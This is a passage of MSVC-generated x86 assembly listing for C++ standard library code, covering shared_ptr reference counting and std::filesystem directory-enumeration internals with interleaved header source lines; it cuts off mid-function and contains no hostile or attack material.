??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 1536 :     constexpr shared_ptr() noexcept = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAE@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Ptr_base<std::filesystem::_Dir_enum_impl>
  0000f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Swap@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXAAV12@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
?_Swap@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXAAV12@@Z PROC ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Swap, COMDAT
; _this$ = ecx

; 1370 :     void _Swap(_Ptr_base& _Right) noexcept { // swap pointers

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1371 :         _STD swap(_Ptr, _Right._Ptr);

  00007	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	51		 push	 ecx
  0000f	e8 00 00 00 00	 call	 ??$swap@PAU_Dir_enum_impl@filesystem@std@@$0A@@std@@YAXAAPAU_Dir_enum_impl@filesystem@0@0@Z ; std::swap<std::filesystem::_Dir_enum_impl *,0>
  00014	83 c4 08	 add	 esp, 8

; 1372 :         _STD swap(_Rep, _Right._Rep);

  00017	8b 55 08	 mov	 edx, DWORD PTR __Right$[ebp]
  0001a	83 c2 04	 add	 edx, 4
  0001d	52		 push	 edx
  0001e	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00021	83 c0 04	 add	 eax, 4
  00024	50		 push	 eax
  00025	e8 00 00 00 00	 call	 ??$swap@PAV_Ref_count_base@std@@$0A@@std@@YAXAAPAV_Ref_count_base@0@0@Z ; std::swap<std::_Ref_count_base *,0>
  0002a	83 c4 08	 add	 esp, 8

; 1373 :     }

  0002d	8b e5		 mov	 esp, ebp
  0002f	5d		 pop	 ebp
  00030	c2 04 00	 ret	 4
?_Swap@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXAAV12@@Z ENDP ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Swap
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Decref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Decref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXXZ PROC ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Decref, COMDAT
; _this$ = ecx

; 1364 :     void _Decref() noexcept { // decrement reference count

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1365 :         if (_Rep) {

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 78 04 00	 cmp	 DWORD PTR [eax+4], 0
  0000e	74 0b		 je	 SHORT $LN2@Decref

; 1366 :             _Rep->_Decref();

  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	8b 49 04	 mov	 ecx, DWORD PTR [ecx+4]
  00016	e8 00 00 00 00	 call	 ?_Decref@_Ref_count_base@std@@QAEXXZ ; std::_Ref_count_base::_Decref
$LN2@Decref:

; 1367 :         }
; 1368 :     }

  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c3		 ret	 0
?_Decref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXXZ ENDP ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Decref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?_Incref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Incref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEXXZ PROC ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Incref, COMDAT
; _this$ = ecx

; 1358 :     void _Incref() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1359 :         if (_Rep) {

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 78 04 00	 cmp	 DWORD PTR [eax+4], 0
  0000e	74 0b		 je	 SHORT $LN2@Incref

; 1360 :             _Rep->_Incref();

  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	8b 49 04	 mov	 ecx, DWORD PTR [ecx+4]
  00016	e8 00 00 00 00	 call	 ?_Incref@_Ref_count_base@std@@QAEXXZ ; std::_Ref_count_base::_Incref
$LN2@Incref:

; 1361 :         }
; 1362 :     }

  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c3		 ret	 0
?_Incref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEXXZ ENDP ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Incref
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??0?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAE@XZ PROC ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Ptr_base<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 1301 :     constexpr _Ptr_base() noexcept = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1302 : 
; 1303 :     ~_Ptr_base() = default;
; 1304 : 
; 1305 :     template <class _Ty2>
; 1306 :     void _Move_construct_from(_Ptr_base<_Ty2>&& _Right) noexcept {
; 1307 :         // implement shared_ptr's (converting) move ctor and weak_ptr's move ctor
; 1308 :         _Ptr = _Right._Ptr;
; 1309 :         _Rep = _Right._Rep;
; 1310 : 
; 1311 :         _Right._Ptr = nullptr;
; 1312 :         _Right._Rep = nullptr;
; 1313 :     }
; 1314 : 
; 1315 :     template <class _Ty2>
; 1316 :     void _Copy_construct_from(const shared_ptr<_Ty2>& _Other) noexcept {
; 1317 :         // implement shared_ptr's (converting) copy ctor
; 1318 :         _Other._Incref();
; 1319 : 
; 1320 :         _Ptr = _Other._Ptr;
; 1321 :         _Rep = _Other._Rep;
; 1322 :     }
; 1323 : 
; 1324 :     template <class _Ty2>
; 1325 :     void _Alias_construct_from(const shared_ptr<_Ty2>& _Other, element_type* _Px) noexcept {
; 1326 :         // implement shared_ptr's aliasing ctor
; 1327 :         _Other._Incref();
; 1328 : 
; 1329 :         _Ptr = _Px;
; 1330 :         _Rep = _Other._Rep;
; 1331 :     }
; 1332 : 
; 1333 :     template <class _Ty2>
; 1334 :     void _Alias_move_construct_from(shared_ptr<_Ty2>&& _Other, element_type* _Px) noexcept {
; 1335 :         // implement shared_ptr's aliasing move ctor
; 1336 :         _Ptr = _Px;
; 1337 :         _Rep = _Other._Rep;
; 1338 : 
; 1339 :         _Other._Ptr = nullptr;
; 1340 :         _Other._Rep = nullptr;
; 1341 :     }
; 1342 : 
; 1343 :     template <class _Ty0>
; 1344 :     friend class weak_ptr; // specifically, weak_ptr::lock()
; 1345 : 
; 1346 :     template <class _Ty2>
; 1347 :     bool _Construct_from_weak(const weak_ptr<_Ty2>& _Other) noexcept {
; 1348 :         // implement shared_ptr's ctor from weak_ptr, and weak_ptr::lock()
; 1349 :         if (_Other._Rep && _Other._Rep->_Incref_nz()) {
; 1350 :             _Ptr = _Other._Ptr;
; 1351 :             _Rep = _Other._Rep;
; 1352 :             return true;
; 1353 :         }
; 1354 : 
; 1355 :         return false;
; 1356 :     }
; 1357 : 
; 1358 :     void _Incref() const noexcept {
; 1359 :         if (_Rep) {
; 1360 :             _Rep->_Incref();
; 1361 :         }
; 1362 :     }
; 1363 : 
; 1364 :     void _Decref() noexcept { // decrement reference count
; 1365 :         if (_Rep) {
; 1366 :             _Rep->_Decref();
; 1367 :         }
; 1368 :     }
; 1369 : 
; 1370 :     void _Swap(_Ptr_base& _Right) noexcept { // swap pointers
; 1371 :         _STD swap(_Ptr, _Right._Ptr);
; 1372 :         _STD swap(_Rep, _Right._Rep);
; 1373 :     }
; 1374 : 
; 1375 :     template <class _Ty2>
; 1376 :     void _Weakly_construct_from(const _Ptr_base<_Ty2>& _Other) noexcept { // implement weak_ptr's ctors
; 1377 :         if (_Other._Rep) {
; 1378 :             _Ptr = _Other._Ptr;
; 1379 :             _Rep = _Other._Rep;
; 1380 :             _Rep->_Incwref();
; 1381 :         } else {
; 1382 :             _STL_INTERNAL_CHECK(!_Ptr && !_Rep);
; 1383 :         }
; 1384 :     }
; 1385 : 
; 1386 :     template <class _Ty2>
; 1387 :     void _Weakly_convert_lvalue_avoiding_expired_conversions(const _Ptr_base<_Ty2>& _Other) noexcept {
; 1388 :         // implement weak_ptr's copy converting ctor
; 1389 :         if (_Other._Rep) {
; 1390 :             _Rep = _Other._Rep; // always share ownership
; 1391 :             _Rep->_Incwref();
; 1392 : 
; 1393 :             if (_Rep->_Incref_nz()) {
; 1394 :                 _Ptr = _Other._Ptr; // keep resource alive during conversion, handling virtual inheritance
; 1395 :                 _Rep->_Decref();
; 1396 :             } else {
; 1397 :                 _STL_INTERNAL_CHECK(!_Ptr);
; 1398 :             }
; 1399 :         } else {
; 1400 :             _STL_INTERNAL_CHECK(!_Ptr && !_Rep);
; 1401 :         }
; 1402 :     }
; 1403 : 
; 1404 :     template <class _Ty2>
; 1405 :     void _Weakly_convert_rvalue_avoiding_expired_conversions(_Ptr_base<_Ty2>&& _Other) noexcept {
; 1406 :         // implement weak_ptr's move converting ctor
; 1407 :         _Rep        = _Other._Rep; // always transfer ownership
; 1408 :         _Other._Rep = nullptr;
; 1409 : 
; 1410 :         if (_Rep && _Rep->_Incref_nz()) {
; 1411 :             _Ptr = _Other._Ptr; // keep resource alive during conversion, handling virtual inheritance
; 1412 :             _Rep->_Decref();
; 1413 :         } else {
; 1414 :             _STL_INTERNAL_CHECK(!_Ptr);
; 1415 :         }
; 1416 : 
; 1417 :         _Other._Ptr = nullptr;
; 1418 :     }
; 1419 : 
; 1420 :     void _Incwref() const noexcept {
; 1421 :         if (_Rep) {
; 1422 :             _Rep->_Incwref();
; 1423 :         }
; 1424 :     }
; 1425 : 
; 1426 :     void _Decwref() noexcept { // decrement weak reference count
; 1427 :         if (_Rep) {
; 1428 :             _Rep->_Decwref();
; 1429 :         }
; 1430 :     }
; 1431 : 
; 1432 : private:
; 1433 :     element_type* _Ptr{nullptr};

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], 0

; 1434 :     _Ref_count_base* _Rep{nullptr};

  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	c7 41 04 00 00
	00 00		 mov	 DWORD PTR [ecx+4], 0

; 1301 :     constexpr _Ptr_base() noexcept = default;

  0001a	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001d	8b e5		 mov	 esp, ebp
  0001f	5d		 pop	 ebp
  00020	c3		 ret	 0
??0?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAE@XZ ENDP ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Ptr_base<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?get@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEPAU_Dir_enum_impl@filesystem@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?get@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEPAU_Dir_enum_impl@filesystem@2@XZ PROC ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::get, COMDAT
; _this$ = ecx

; 1297 :     _NODISCARD element_type* get() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1298 :         return _Ptr;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 00		 mov	 eax, DWORD PTR [eax]

; 1299 :     }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?get@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEPAU_Dir_enum_impl@filesystem@2@XZ ENDP ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::get
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_Dir_enum_impl@filesystem@std@@QAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G_Dir_enum_impl@filesystem@std@@QAEPAXI@Z PROC	; std::filesystem::_Dir_enum_impl::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_Dir_enum_impl@filesystem@std@@QAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 40		 push	 64			; 00000040H
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_G_Dir_enum_impl@filesystem@std@@QAEPAXI@Z ENDP	; std::filesystem::_Dir_enum_impl::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1_Dir_enum_impl@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Dir_enum_impl@filesystem@std@@QAE@XZ PROC		; std::filesystem::_Dir_enum_impl::~_Dir_enum_impl, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	83 c1 38	 add	 ecx, 56			; 00000038H
  0000d	e8 00 00 00 00	 call	 ??1_Find_file_handle@filesystem@std@@QAE@XZ ; std::filesystem::_Find_file_handle::~_Find_file_handle
  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	e8 00 00 00 00	 call	 ??1directory_entry@filesystem@std@@QAE@XZ ; std::filesystem::directory_entry::~directory_entry
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??1_Dir_enum_impl@filesystem@std@@QAE@XZ ENDP		; std::filesystem::_Dir_enum_impl::~_Dir_enum_impl
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0_Dir_enum_impl@filesystem@std@@QAE@$$QAU_Creator@012@W4directory_options@12@@Z
_TEXT	SEGMENT
tv77 = -8						; size = 4
_this$ = -4						; size = 4
__Create_data$ = 8					; size = 4
___formal$ = 12						; size = 4
??0_Dir_enum_impl@filesystem@std@@QAE@$$QAU_Creator@012@W4directory_options@12@@Z PROC ; std::filesystem::_Dir_enum_impl::_Dir_enum_impl, COMDAT
; _this$ = ecx

; 2589 :         explicit _Dir_enum_impl(_Creator&& _Create_data, const directory_options = {})

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2590 :             : _Dir(_STD move(_Create_data._Dir)) {

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ??0directory_entry@filesystem@std@@QAE@XZ ; std::filesystem::directory_entry::directory_entry
  00011	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00014	83 c0 38	 add	 eax, 56			; 00000038H
  00017	89 45 f8	 mov	 DWORD PTR tv77[ebp], eax
  0001a	8b 4d 08	 mov	 ecx, DWORD PTR __Create_data$[ebp]
  0001d	83 c1 18	 add	 ecx, 24			; 00000018H
  00020	51		 push	 ecx
  00021	e8 00 00 00 00	 call	 ??$move@AAU_Find_file_handle@filesystem@std@@@std@@YA$$QAU_Find_file_handle@filesystem@0@AAU120@@Z ; std::move<std::filesystem::_Find_file_handle &>
  00026	83 c4 04	 add	 esp, 4
  00029	50		 push	 eax
  0002a	8b 4d f8	 mov	 ecx, DWORD PTR tv77[ebp]
  0002d	e8 00 00 00 00	 call	 ??0_Find_file_handle@filesystem@std@@QAE@$$QAU012@@Z ; std::filesystem::_Find_file_handle::_Find_file_handle

; 2591 :             // directory_options provided, but unused to keep signature identical to recursive_directory_iterator
; 2592 :             _Entry._Path = _STD move(_Create_data._Path);

  00032	8b 55 08	 mov	 edx, DWORD PTR __Create_data$[ebp]
  00035	52		 push	 edx
  00036	e8 00 00 00 00	 call	 ??$move@AAVpath@filesystem@std@@@std@@YA$$QAVpath@filesystem@0@AAV120@@Z ; std::move<std::filesystem::path &>
  0003b	83 c4 04	 add	 esp, 4
  0003e	50		 push	 eax
  0003f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00042	83 c1 20	 add	 ecx, 32			; 00000020H
  00045	e8 00 00 00 00	 call	 ??4path@filesystem@std@@QAEAAV012@$$QAV012@@Z ; std::filesystem::path::operator=

; 2593 :             _Refresh(_Create_data._Find_data);

  0004a	8b 45 08	 mov	 eax, DWORD PTR __Create_data$[ebp]
  0004d	83 c0 1c	 add	 eax, 28			; 0000001cH
  00050	50		 push	 eax
  00051	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00054	e8 00 00 00 00	 call	 ?_Refresh@_Dir_enum_impl@filesystem@std@@QAEXABU__std_fs_find_data@@@Z ; std::filesystem::_Dir_enum_impl::_Refresh

; 2594 :         }

  00059	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0005c	8b e5		 mov	 esp, ebp
  0005e	5d		 pop	 ebp
  0005f	c2 08 00	 ret	 8
??0_Dir_enum_impl@filesystem@std@@QAE@$$QAU_Creator@012@W4directory_options@12@@Z ENDP ; std::filesystem::_Dir_enum_impl::_Dir_enum_impl
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Refresh@_Dir_enum_impl@filesystem@std@@QAEXABU__std_fs_find_data@@@Z
_TEXT	SEGMENT
$T1 = -48						; size = 8
tv84 = -40						; size = 4
tv68 = -36						; size = 4
_this$ = -32						; size = 4
$T2 = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
__Data$ = 8						; size = 4
?_Refresh@_Dir_enum_impl@filesystem@std@@QAEXABU__std_fs_find_data@@@Z PROC ; std::filesystem::_Dir_enum_impl::_Refresh, COMDAT
; _this$ = ecx

; 2584 :         void _Refresh(const __std_fs_find_data& _Data) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 30	 sub	 esp, 48			; 00000030H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00010	89 4d e0	 mov	 DWORD PTR _this$[ebp], ecx

; 2585 :             _Entry._Refresh(_Data);

  00013	8b 45 e0	 mov	 eax, DWORD PTR _this$[ebp]
  00016	89 45 dc	 mov	 DWORD PTR tv68[ebp], eax
  00019	8b 4d 08	 mov	 ecx, DWORD PTR __Data$[ebp]
  0001c	51		 push	 ecx
  0001d	8b 4d dc	 mov	 ecx, DWORD PTR tv68[ebp]
  00020	e8 00 00 00 00	 call	 ?_Refresh@directory_entry@filesystem@std@@AAEXABU__std_fs_find_data@@@Z ; std::filesystem::directory_entry::_Refresh

; 2586 :             _Entry._Path.replace_filename(wstring_view{_Data._File_name});

  00025	8b 55 e0	 mov	 edx, DWORD PTR _this$[ebp]
  00028	83 c2 20	 add	 edx, 32			; 00000020H
  0002b	89 55 d8	 mov	 DWORD PTR tv84[ebp], edx
  0002e	6a 00		 push	 0
  00030	8b 45 08	 mov	 eax, DWORD PTR __Data$[ebp]
  00033	83 c0 2c	 add	 eax, 44			; 0000002cH
  00036	50		 push	 eax
  00037	8d 4d d0	 lea	 ecx, DWORD PTR $T1[ebp]
  0003a	e8 00 00 00 00	 call	 ??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_W@Z ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  0003f	50		 push	 eax
  00040	8d 4d e4	 lea	 ecx, DWORD PTR $T2[ebp]
  00043	e8 00 00 00 00	 call	 ??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@W4format@012@@Z ; std::filesystem::path::path<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
  00048	8d 4d e4	 lea	 ecx, DWORD PTR $T2[ebp]
  0004b	51		 push	 ecx
  0004c	8b 4d d8	 mov	 ecx, DWORD PTR tv84[ebp]
  0004f	e8 00 00 00 00	 call	 ?replace_filename@path@filesystem@std@@QAEAAV123@ABV123@@Z ; std::filesystem::path::replace_filename
  00054	8d 4d e4	 lea	 ecx, DWORD PTR $T2[ebp]
  00057	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path

; 2587 :         }

  0005c	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0005f	33 cd		 xor	 ecx, ebp
  00061	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00066	8b e5		 mov	 esp, ebp
  00068	5d		 pop	 ebp
  00069	c2 04 00	 ret	 4
?_Refresh@_Dir_enum_impl@filesystem@std@@QAEXABU__std_fs_find_data@@@Z ENDP ; std::filesystem::_Dir_enum_impl::_Refresh
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1_Creator@_Dir_enum_impl@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Creator@_Dir_enum_impl@filesystem@std@@QAE@XZ PROC	; std::filesystem::_Dir_enum_impl::_Creator::~_Creator, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	83 c1 18	 add	 ecx, 24			; 00000018H
  0000d	e8 00 00 00 00	 call	 ??1_Find_file_handle@filesystem@std@@QAE@XZ ; std::filesystem::_Find_file_handle::~_Find_file_handle
  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	e8 00 00 00 00	 call	 ??1path@filesystem@std@@QAE@XZ ; std::filesystem::path::~path
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??1_Creator@_Dir_enum_impl@filesystem@std@@QAE@XZ ENDP	; std::filesystem::_Dir_enum_impl::_Creator::~_Creator
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0_Creator@_Dir_enum_impl@filesystem@std@@QAE@ABVpath@23@W4directory_options@23@@Z
_TEXT	SEGMENT
$T1 = -36						; size = 8
$T2 = -28						; size = 8
$T3 = -20						; size = 8
tv69 = -12						; size = 4
__Error$ = -8						; size = 4
_this$ = -4						; size = 4
__Path_arg$ = 8						; size = 4
__Options$ = 12						; size = 4
??0_Creator@_Dir_enum_impl@filesystem@std@@QAE@ABVpath@23@W4directory_options@23@@Z PROC ; std::filesystem::_Dir_enum_impl::_Creator::_Creator, COMDAT
; _this$ = ecx

; 2572 :             _Creator(const path& _Path_arg, const directory_options _Options) : _Path(_Path_arg) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 24	 sub	 esp, 36			; 00000024H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR tv69[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Path_arg$[ebp]
  00012	51		 push	 ecx
  00013	8b 4d f4	 mov	 ecx, DWORD PTR tv69[ebp]
  00016	e8 00 00 00 00	 call	 ??0path@filesystem@std@@QAE@ABV012@@Z ; std::filesystem::path::path
  0001b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001e	83 c1 18	 add	 ecx, 24			; 00000018H
  00021	e8 00 00 00 00	 call	 ??0_Find_file_handle@filesystem@std@@QAE@XZ ; std::filesystem::_Find_file_handle::_Find_file_handle

; 2573 :                 const auto _Error = _Open_dir(_Path, _Options, _Dir, _Find_data);

  00026	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00029	83 c2 1c	 add	 edx, 28			; 0000001cH
  0002c	52		 push	 edx
  0002d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00030	83 c0 18	 add	 eax, 24			; 00000018H
  00033	50		 push	 eax
  00034	8b 4d 0c	 mov	 ecx, DWORD PTR __Options$[ebp]
  00037	51		 push	 ecx
  00038	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0003b	52		 push	 edx
  0003c	e8 00 00 00 00	 call	 ?_Open_dir@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAVpath@23@W4directory_options@23@AAU_Find_file_handle@23@AAU__std_fs_find_data@@@Z ; std::filesystem::_Dir_enum_impl::_Open_dir
  00041	83 c4 10	 add	 esp, 16			; 00000010H
  00044	89 45 f8	 mov	 DWORD PTR __Error$[ebp], eax

; 2574 :                 if (_Error == __std_win_error::_Success) {

  00047	83 7d f8 00	 cmp	 DWORD PTR __Error$[ebp], 0
  0004b	75 22		 jne	 SHORT $LN2@Creator

; 2575 :                     _Status = {true, __std_win_error::_Success};

  0004d	c6 45 ec 01	 mov	 BYTE PTR $T3[ebp], 1
  00051	c7 45 f0 00 00
	00 00		 mov	 DWORD PTR $T3[ebp+4], 0
  00058	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0005b	8b 4d ec	 mov	 ecx, DWORD PTR $T3[ebp]
  0005e	8b 55 f0	 mov	 edx, DWORD PTR $T3[ebp+4]
  00061	89 88 6c 02 00
	00		 mov	 DWORD PTR [eax+620], ecx
  00067	89 90 70 02 00
	00		 mov	 DWORD PTR [eax+624], edx
  0006d	eb 47		 jmp	 SHORT $LN5@Creator
$LN2@Creator:

; 2576 :                 } else if (_Error == __std_win_error::_No_more_files) {

  0006f	83 7d f8 12	 cmp	 DWORD PTR __Error$[ebp], 18 ; 00000012H
  00073	75 22		 jne	 SHORT $LN4@Creator

; 2577 :                     _Status = {false, __std_win_error::_Success};

  00075	c6 45 e4 00	 mov	 BYTE PTR $T2[ebp], 0
  00079	c7 45 e8 00 00
